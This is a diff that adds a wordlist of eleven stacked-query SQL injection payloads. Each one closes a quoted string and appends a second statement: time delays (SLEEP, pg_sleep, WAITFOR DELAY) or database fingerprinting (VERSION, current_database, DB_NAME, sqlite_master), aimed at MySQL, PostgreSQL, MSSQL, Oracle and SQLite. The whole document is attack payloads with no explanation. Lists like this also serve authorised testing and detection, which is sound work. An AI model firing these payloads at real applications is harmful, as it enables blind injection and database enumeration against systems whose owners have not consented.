@@ -1,0 +1,11 @@
+'; SELECT 1-- -
+'; SELECT NULL-- -
+'; SELECT SLEEP(5)-- -
+'; SELECT VERSION()-- -
+'; SELECT pg_sleep(5)--
+'; WAITFOR DELAY '0:0:5'--
+'; SELECT current_database()-- -
+'; SELECT DB_NAME()-- -
+'; SELECT USER FROM dual-- -
+'; SELECT sqlite_version()-- -
+'; SELECT name FROM sqlite_master LIMIT 1-- -
